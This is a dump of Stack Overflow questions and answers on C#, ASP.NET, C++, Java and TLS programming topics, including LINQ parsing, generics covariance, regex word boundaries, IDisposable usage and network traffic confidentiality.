"<p>I've got some longitude\latitude coordinates bunched together in a string that I'd like to split into longitude\latitude pairs.  Thanks to stackoverflow I've been able to come up with the some linq that will split it into a multidimensional string array.  Is there a way to split the string directly into an object that accepts the longitude latitude vs a string array then create the object?</p>

<pre><code>string segment = ""51.54398, -0.27585;51.55175, -0.29631;51.56233, -0.30369;51.57035, -0.30856;51.58157, -0.31672;51.59233, -0.3354""

string[][] array = segment.Split(';').Select(s =&gt; s.Split(',')).ToArray();
foreach (string[] pair in array)
{
//create object here
}
</code></pre>
","33708","","<p>You are close. Something like this might help:</p>

<pre><code>var pairSequence = segment.Split(';')
        .Select(s =&gt; s.Split(','))
        .Select(a =&gt; new { Lat = double.Parse(a[0]), Long = double.Parse(a[1]) });
</code></pre>
"
"<p>I am a asp .net beginner. I want to use some objects created at Site.Master.cs in Site.Master. Is there an easy way to do it?</p>

<p>I know how to do it in MVC(by using view(the object)). But how can i do it in normal ASP .net web application?</p>
","33708","","<p>If the <code>@Page</code> directive in your <code>.aspx</code> file has <code>Inherits=""XYZ""</code> where <code>XYZ</code> is the class declared in your <code>.cs</code> file, you can simply add a <code>protected</code> field to your class and assign a value to it. You'll be able to access it in the <code>.aspx</code> file just by using its name.</p>

<p>You can also use <a href=""http://msdn.microsoft.com/en-us/library/system.web.httpcontext.items.aspx"" rel=""nofollow""><code>HttpContext.Items</code> property</a> to keep objects during a single request:</p>

<pre><code>HttpContext.Current.Items[""SavedItem""] = ""hello world"";
</code></pre>

<p>And use it in page:</p>

<pre><code>&lt;%= ((string)Context.Items[""SavedItem""]) %&gt;
</code></pre>
"
"<p>I'm doing a host for an AI contest, and have a randomBot that choice random possible values.</p>

<p>The bot has 2 exported functions: Init(_seed) and MakeMove()</p>

<p>To play exactly same games host have a defined seed value for each bot. and its passes it in the Init function.</p>

<p>The Init function of random bot has a srand(_seed) function call.
The MakeMove function of random bot has a rand() function call.</p>

<p>Now the problem is that after loading 2 bots, each game should be the same with the same seed values, but they are different.</p>

<p>As I know srand should store its value per module/thread and not share it.</p>

<p>I made a test and created a function mysrand and myrand that are not exported with calls to srand and rand respectively.</p>

<p>I replaced the srand and rand inside the exported functions with mysrand and myrand... and it worked... </p>

<p>I have a clue why this is happening but not sure...</p>

<p>So why exactly does it happen and how to avoid it because I want the contestants to use any function they want inside the exported functions (don't want to use my proxy functions). </p>

<p>Thanks.</p>

<p>I'm using windows, compilers: gcc, visual C++, borland C++ builder</p>
","33708","","<blockquote>
  <p>As I know srand should store its value per module/thread and not share it.</p>
</blockquote>

<p>This is not necessarily true. From <code>rand</code> man page on Ubuntu:</p>

<blockquote>
<pre><code> The function rand() is not reentrant or thread-safe, since it uses hidâ
   den state that is modified on each call.  This might just be  the  seed
   value to be used by the next call, or it might be something more elaboâ
   rate.  In order to get reproducible behavior in a threaded application,
   this  state must be made explicit; this can be done using the reentrant
   function rand_r().
</code></pre>
</blockquote>

<p>You might end up corrupting RNG state if your C library implementation does not explicitly use local state instead of shared state for <code>rand</code>.</p>
"
"<p>So I have set up my web.config to authenticate forms. I have the two pieces of code in my web.config but it is acting strange. When you go to www.mysite.com it redirects to the login.aspx page but when you go to www.mysite.com/default.aspx it does not redirect. why is it doing this? I also have the default doc set as default.aspx</p>

<pre><code>&lt;system.web&gt;
    &lt;compilation debug=""true"" targetFramework=""4.0"" /&gt;
    &lt;authentication mode=""Forms""&gt;
        &lt;forms loginUrl=""~/Login.aspx"" timeout=""2880""         defaultUrl=""account/default.aspx"" /&gt;
    &lt;/authentication&gt;
    &lt;authorization&gt;
        &lt;deny users=""?"" /&gt;
    &lt;/authorization&gt;

&lt;location path=""default.aspx""&gt;
    &lt;system.web&gt;
        &lt;authorization&gt;
            &lt;allow users=""*"" /&gt;
        &lt;/authorization&gt;
    &lt;/system.web&gt;
&lt;/location&gt;
</code></pre>
","33708","","<p>As clearly shown in the config file, you have allowed unauthenticated users to access ""default.aspx"" URL explicitly. There is no such thing for ""/"" URL. Note that it does not matter that they (might) end up pointing to the same physical file on disk eventually. Only the URL matters for authorization purposes. You can clone your <code>&lt;location&gt;</code> tag and simply have another one for <code>path=""/""</code> that allows access to all users, regardless of their authentication status.</p>
"
"<p>Here i used the dispose method in aspx.cs, but i am not sure wheather the way of disposing the objects is done it in correct way.
Obvisoly i surf it from net and used it in my code,can u please say wheather the objects is disposing in correct format.</p>

<p>This is my method in aspx.cs</p>

<pre><code>public List&lt;CausesField&gt; list(DataTable dt)
        {
             List&lt;CausesField&gt; lst = new List&lt;CausesField&gt;();
            foreach (DataRow row in dt.Rows)
            {

                    using (CausesField SignUpDetails = new CausesField())
                    {
                        SignUpDetails.FirstName = row[""FirstName""].ToString();
                        SignUpDetails.LastName = row[""LastName""].ToString();
                        SignUpDetails.Birthdate = row[""BirthDay""].ToString();
                        SignUpDetails.Gender = row[""Gender""].ToString();

                        lst.Add(SignUpDetails);
                        SignUpDetails.Dispose();
                    }


            }
            return lst;

        }
</code></pre>

<p>My Class file:</p>

<pre><code>public  class CausesField:IDisposable
    {

        public string FirstName { get; set; }  public string LastName { get; set; }

        public string Birthdate { get; set; }  public string Gender { get; set; }

         private Component component = new Component();

        private bool disposed = false;

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        private void Dispose(bool disposing)
        {
            // Check to see if Dispose has already been called.
            if (!this.disposed)
            {
                // If disposing equals true, dispose all managed 
                // and unmanaged resources.
                if (disposing)
                {
                    // Dispose managed resources.
                    component.Dispose();
                }

            }
            disposed = true;
        }
    }
</code></pre>
","33708","","<p>The <code>using</code> statement automatically calls <code>Dispose</code> at the end of the block, so you should not call it yourself again. </p>

<p>Also, in general, unless you are holding onto some external resources (locks, file handles, sockets, database connections, etc.) or unmanaged memory (and I suspect this to be the case in your case), you should not have a finalizer or a <code>Dispose</code> method. The garbage collector takes care of freeing up managed memory.</p>
"
"<p>I'm using SQL Session State in my app, however given that we have several connection strings already, it would be easier to maintain the config if all the connection strings were held, well, in <code>&lt;connectionStrings&gt;</code>. </p>

<p>My question is, is it possible somehow to specify an existing connection string in the <code>sessionState</code> config?</p>

<pre><code>   &lt;connectionStrings&gt;
        &lt;add name=""ConnString1"" connectionString=""data source=xx;Initial Catalog=zzz;""  
             providerName=""System.Data.SqlClient"" /&gt;
        &lt;add name=""EFConnString"" 
             connectionString=""metadata=res://*/EF.csdl|res://*/EF.ssdl|res://*/EF.msl;provider=System.Data.SqlClient;provider connection string=&amp;quot;data source=xxx;initial catalog=yyy;App=EntityFramework&amp;quot;"" 
             providerName=""System.Data.EntityClient"" /&gt;
        &lt;add name=""SessionStateConn"" connectionString=""data source=xx;Initial Catalog=zzz;""  
             providerName=""System.Data.SqlClient"" /&gt;
  &lt;/connectionStrings&gt;
  &lt;system.web&gt;
    &lt;sessionState mode=""SQLServer"" 
                  sqlConnectionString=""**SessionStateConn**"" 
                  sqlCommandTimeout=""30"" customProvider="""" ... etc
    &lt;/sessionState&gt;
</code></pre>
","33708","","<p>Not really. At least not in a straightforward way that does not require change in the code or transforming the configuration file. The reason behind this inconsistency in ASP.NET is that SQL Server session state was introduced in the original version of ASP.NET whereas the <code>connectionStrings</code> section was added in version 2.0. The <code>sessionState</code> tag designers could not rely on a system that had not been invented/shipped yet.</p>
"
"<p>I keep reading that using global variables is bad programming design, but does that mean global constants are also bad? </p>

<p>What alternatives are there instead of global variables/constants and what's the best way to declare constants that's needed in multiple source files ?</p>
","33708","","<p>The primary reason behind global variables being bad is reliance of shared state, which makes it easy for different parts of a program to cause unanticipated interference with other parts of the program by manipulating the shared state in ways that you did not intend to, making the program more error prone, hard to debug, and hard to maintain.</p>

<p>Constants, on the other hand, are pretty much okay, except for the fact that they pollute the global namespace (which might cause unintended consequences at compile time by changing the meaning of a symbol in the compilation unit). If you can declare them in a specific namespace/scope, then you're going to be fine.</p>
"
"<p>The following code is returning in <code>??????</code> as output , when <code>str</code> has Arabic string :</p>

<pre><code>String str=""ÙØ±Ø­Ø¨Ø§"",str2="""";
for (int i = 0; i &lt; str.length(); ++i) {
                str2 += displayChar(str.charAt(reorder[i]));
                System.out.print(reorder[i]);
            }
   System.out.println(str2); // output is : ?????
</code></pre>

<p>and :</p>

<pre><code>String displayChar(char c) {
        if (c &lt; '\u0010') {
            return ""0x0"" + Integer.toHexString(c);
        } else if (c &lt; '\u0020' || c &gt;= '\u007f') {
            return ""0x"" + Integer.toHexString(c);
        } else {
            return c+"""";
        }
    }
</code></pre>

<p>For 
    <code>reorder</code> is <code>integer</code> array only carries the new index (order) of the character in the given <code>str</code></p>

<pre><code>Here is the complete code, .. hope it will help you to understand the problem :
/*
 * (C) Copyright IBM Corp. 1999, All Rights Reserved
 *
 * version 1.0
 */

import java.io.*;

/**
 * A simple command-line interface to the BidiReference class.
 * &lt;p&gt;
 * This prompts the user for an ASCII string, runs the reference
 * algorithm on the string, and displays the results to the terminal.
 * An empty return to the prompt exits the program.
 * &lt;p&gt;
 * ASCII characters are preassigned various bidi direction types. 
 * These types can be displayed by the user for reference by
 * typing &lt;code&gt;-display&lt;/code&gt; at the prompt.  More help can be
 * obtained by typing &lt;code&gt;-help&lt;/code&gt; at the prompt.
 */
public class BidiReferenceTest {
    BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
    PrintWriter writer = new PrintWriter(new BufferedOutputStream(System.out));
    BidiReferenceTestCharmap charmap = BidiReferenceTestCharmap.TEST_ARABIC;
    byte baseDirection = -1;

    /**
     * Run the interactive test.
     */
    public static void main(String args[]) {
        new BidiReferenceTest().run();
    }

    void run() {
        //printHelp();

        while (true) {
            writer.print(""&gt; "");
            writer.flush();
            String input;
            try {
                input = reader.readLine();
            }
            catch (Exception e) {
                writer.println(e);
                continue;
            }

            if (input.length() == 0) {
                writer.println(""Bye!"");
                writer.flush();
                return;
            }

            if (input.charAt(0) == '-') { // command
                int limit = input.indexOf(' ');
                if (limit == -1) {
                    limit = input.length();
                }
                String cmd = input.substring(0, limit);
                if (cmd.equals(""-display"")) {
                    charmap.dumpInfo(writer);
                } else if (cmd.equals(""-english"")) {
                    charmap = BidiReferenceTestCharmap.TEST_ENGLISH;
                    charmap.dumpInfo(writer);
                } else if (cmd.equals(""-hebrew"")) {
                    charmap = BidiReferenceTestCharmap.TEST_HEBREW;
                    charmap.dumpInfo(writer);
                } else if (cmd.equals(""-arabic"")) {
                    charmap = BidiReferenceTestCharmap.TEST_ARABIC;
                    charmap.dumpInfo(writer);
                } else if (cmd.equals(""-mixed"")) {
                    charmap = BidiReferenceTestCharmap.TEST_MIXED;
                    charmap.dumpInfo(writer);
                } else if (cmd.equals(""-baseLTR"")) {
                    baseDirection = 0;
                } else if (cmd.equals(""-baseRTL"")) {
                    baseDirection = 1;
                } else if (cmd.equals(""-baseDefault"")) {
                    baseDirection = -1;
                } else {
                }
            } else {

                String ss= runSample(input);
                System.out.println(ss);
                Character.UnicodeBlock block =  Character.UnicodeBlock.of(Character.codePointAt(ss, 0));

            }
        }
    }



    String runSample(String str) {
        String str2 = """";
        try {
            charmap = BidiReferenceTestCharmap.TEST_ARABIC;

            byte[] codes = charmap.getCodes(str);
            baseDirection = 1;
            BidiReference bidi = new BidiReference(codes, baseDirection); // baseDirection = 1
            int[] reorder = bidi.getReordering(new int[] { codes.length });
            /*
            writer.println(""base level: "" + bidi.getBaseLevel() + (baseDirection != -1 ? "" (forced)"" : """"));

            // output original text
            for (int i = 0; i &lt; str.length(); ++i) {
                displayChar(str.charAt(i));
            }
            writer.println();
             */
            // output visually ordered text
            for (int i = 0; i &lt; str.length(); ++i) {
                str2 += displayChar(str.charAt(reorder[i]));
                System.out.print(reorder[i]);
            }
            return str2;
        }
        catch (Exception e) {
            return """";
        }
    }

    String displayChar(char c) {
        if (c &lt; '\u0010') {
            return ""0x0"" + Integer.toHexString(c);
        } else if (c &lt; '\u0020' || c &gt;= '\u007f') {
            return ""0x"" + Integer.toHexString(c);
        } else {
            return c+"""";
        }
    }
}
</code></pre>
","33708","","<p>One problem is that your terminal probably does not support Unicode characters correctly (this might not be the <em>only</em> problem).</p>
"
"<p>I have two classes as following, Class A inherits from Class B.</p>

<pre><code>public class A 
{
     public string Title { get; set; }
}

public class B: A 
{

}
</code></pre>

<p>Then I have a function as following which takes in a list of items of class A</p>

<pre><code>public static void Get(List&lt;A&gt; values)
{
    //do something
}
</code></pre>

<p>Now when I try to pass a list of items of Class B, into the function as following    </p>

<pre><code>private function void Test()
{
     var k = new List&lt;B&gt;();
     Get(k);
}
</code></pre>

<p>I get the following error message</p>

<p>cannot convert from 'System.Collections.Generic.List&lt;B>' to 'System.Collections.Generic.List&lt;A>'  </p>

<p>Should this not work as B just inherits from A and will have the properties that A has?</p>

<p>I have already spent hours trying to look this up but have not been to figure out what I an doing wrong, Please help.</p>
","33708","","<p>No, it should not. It is potentially unsafe:</p>

<pre><code>class C : A {

}

public static void Get(List&lt;A&gt; values)
{
    values.Add(new C());
}
</code></pre>

<p>If you were to call <code>Get</code> with <code>new List&lt;B&gt;()</code>, it would be unsafe, as you'd be inserting instances of <code>C</code> in <code>List&lt;B&gt;</code>.</p>

<p>It would be safe, however, if <code>List&lt;T&gt;</code> was a ""read-only"" interface, in which case <em>covariance</em>, which is what you are looking for, would be safe. You can change <code>List&lt;A&gt;</code> to <code>IEnumerable&lt;A&gt;</code> instead and it'll work.</p>
"
"<p>I am trying to replace a specific sub string from a string in C#.</p>

<p>My string is: <code>This is a car.</code></p>

<p>And I am trying to replace 'a' with string.Empty from the string with this code:</p>

<pre><code>data = data.Replace(""a"", string.Empty);
</code></pre>

<p>But my output is : </p>

<pre><code>This is c r.
</code></pre>

<p>I just want to remove isolated occurence of 'a', and not when this char/word is used in some other word (like car).</p>

<p>I want a output like ths: <code>This is car.</code></p>

<p>How can I do this in C#?</p>
","33708","","<p>You need a regex pattern that only matches ""a"" on word boundaries. <code>""\b""</code> in a regex pattern denotes a word boundary:</p>

<pre><code>Regex.Replace(""this is a car"", @""\ba\b"", """")
</code></pre>

<p>If you want to match uppercase ""A"" as well, make sure your pattern is ignoring case (<code>RegexOptions.IgnoreCase</code>) or explicitly add ""A"" to the pattern like <code>""\b[Aa]\b""</code>.</p>
"
"<p>I've just tried <code>TryParse</code>, and am new to C# and just trying to understand everything, and then hopefully best practices...</p>

<p>Syntactically this works:</p>

<pre><code>double number = Double.Parse(C.ReadLine());
</code></pre>

<p>Does TryParse only return a boolean, true if parse succeeds? </p>

<p>When I do this:</p>

<pre><code>double number;
bool b = Double.TryParse(C.ReadLine(), out number);
</code></pre>

<p><code>number</code> is the parsed input, from <code>C.ReadLine()</code>, as expected, everything works. Is this how TryParse is normally used? Trying to be efficient, appreciate advice like <a href=""http://www.c-sharpcorner.com/Blogs/228/"" rel=""nofollow"">this</a>.</p>

<p>Any advice on approach welcome, plus info on online resources for Try(things).</p>
","33708","","<p><code>Parse</code> will return the double value if it succeeds and throws an exception otherwise. TryParse will return a boolean value representing the success of the operation and if it does succeed, it fills in the parsed value in the <code>out</code> argument you pass to it. It will never throw an exception.</p>

<p>In general, you should use <code>TryParse</code> when you expect the input string to not be a valid number and you have the logic to handle it (and display an error message, for instance). </p>

<p>If you don't expect the input string to be anything except a valid double you should use <code>Parse</code>.</p>
"
"<p>I'm confused as to how generics, namely <code>T</code> works in C#. It doesn't seem to behave the same way as C++, unless I'm mistaken. I'm trying to create a simple interface for a data gateway:</p>

<p><strong>EDIT</strong> Updated to match the answers. Visual Studio now complains the derived classes don't implement the interface methods.</p>

<pre><code>public interface IDataGateway&lt;T&gt;
{
    void InsertRow(T row);
    void UpdateRow(T row);
    IEnumerable&lt;T&gt; GetTable();
}

public class LibraryGateway : IDataGateway&lt;Media&gt;
{
    public void InsertRow(Media item) { }
    public void Updaterow(Media item) { }
    public IEnumerable&lt;Media&gt; GetTable() { }
}
</code></pre>

<p>I do not know what type will be passed, which is why I'm trying to use generics.</p>
","33708","","<p>You are declaring the type argument on each method individually. You should declare it on the interface type itself.</p>

<pre><code>public interface IDataGateway&lt;T&gt;
{
    void InsertRow(T row);
    void UpdateRow(T row);
    IEnumerable&lt;T&gt; GetTable(T table);
}

public class LibraryGateway : IDataGateway&lt;Media&gt;
{
    public void InsertRow(Media item) { }
    public void Updaterow(Media item) { }
    public IEnumerable&lt;Media&gt; GetTable() { }
}
</code></pre>

<p>To clarify, your current implementation could be rewritten as:</p>

<pre><code>public interface IDataGateway
{
    void InsertRow&lt;T&gt;(T row);
    void UpdateRow&lt;U&gt;(U row);
    IEnumerable&lt;V&gt; GetTable(V table);
}
</code></pre>

<p>That is, there is no requirement for <code>T</code> to be the same as <code>U</code> and <code>V</code>. Each method is genericized by its own type parameter, but the containing interface type itself is not generic.</p>

<p>By declaring the type argument on the type itself, you restrict the type arguments of the methods to be identical when implemented by a subclass. In C++ terms, which you seem to be familiar with, your current implementation is analogous to three separate template functions whereas my implementation is more similar to a template class.</p>
"
"<p>I'm working on a network program and I don't want anyone to know what kind of information is being passed when they sniff the network. Would using TLS achieve this? My main reason is that I want to keep the protocol I'm using to myself for now. If not please tell me if there is anything that can achieve my goal.</p>
","33708","","<p>It depends on a lot of things, e.g. what your exact threat model is, and how much information leakage you can tolerate.</p>

<p>For TLS to provide adequate protection, these assumptions must be true:</p>

<ol>
<li>Obviously, you should use a correct implementation, otherwise, if for instance, you are using SecureTransport from iOS 7.0.4, all bets are off.</li>
<li>You should enforce a minimum version requirement and only support secure ciphersuites. If you allow downgrade to SSLv2, you are setting yourself up for problems.</li>
<li>You check for validity of the server public key. You'd be surprised how many client apps skip this.</li>
<li>You use client certificates to authenticate the client, as well as the server, otherwise, it is possible to write a phony client that talks to your TLS server and reverse engineer your protocol. (You can also authenticate the client early in the protocol lifecycle using other means, but that part of your protocol would not be safe).</li>
<li>You keep the private keys secure.</li>
<li>(If you are using X509 certificates and trust chains:) Certificate authorities that you trust do what they are supposed to do, i.e. not sign certificates in your name for others.</li>
<li>You will still leak some packet length and timing information that you hope would not be complete enough for the reverse engineer.</li>
<li>The attacker does not control your client or server or have access to the binaries on any side. If, like an iPhone app, you are giving away the client binary, you have already lost.</li>
<li>Your higher level protocol cannot be tricked into say, redirecting to another server blindly, or lose its mind and do some other crazy thing when the client secure channel is interrupted. This can be hard to notice at times and depends on many other factors.</li>
<li>Something else I have probably missed here.</li>
</ol>
"
"<p>For example, we have this class:</p>

<pre><code>class my_class
{
public:
  friend my_class operator* (const my_class&amp;, int a);
  friend my_class operator* (int a, my_class&amp;);  
};

my_class operator* (int a, my_class&amp;)
{
    // do my_class * a
}

my_class operator* (int a, my_class&amp;)
{
    // do a * my_class
}
</code></pre>

<p>is it possible to do just one operator* to do what these two do?</p>

<p>Thanks!</p>
","33708","","<p>You cannot do that. However, you can implement one and simply call it from the other one:</p>

<pre><code>my_class operator *(const my_class &amp;l, int r) {
    // implement the actual operator here.
}

my_class operator *(int l, const my_class &amp;r) {
    return r * l;
}
</code></pre>

<p>(Note that you cannot implement the latter function as part of the class. You have to do it externally. The first function can be implemented as an instance method, because its first argument is of the class type.)</p>
"